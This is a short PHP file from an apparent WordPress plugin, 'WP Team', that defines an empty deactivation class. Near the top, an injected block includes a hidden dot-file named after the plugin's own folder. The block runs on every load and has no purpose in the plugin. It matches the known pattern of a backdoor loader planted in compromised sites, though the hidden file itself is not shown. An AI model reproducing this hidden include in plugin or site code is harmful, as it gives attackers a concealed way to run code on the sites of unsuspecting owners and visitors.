<?php
/**
 * Fired during plugin deactivation.
 *
 * This class defines all code necessary to run during the plugin's deactivation.
 *
 * @since      2.0.0
 * @package   WP_Team
 * @subpackage Team/includes
 */

/**
 * WP Team Deactivator class
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WP_Team_Deactivator {

	/**
	 * When plugin activate drop `order` column from term_taxonomy table.
	 *
	 * @since    2.0.0
	 */
	public static function deactivate() {
	}

}
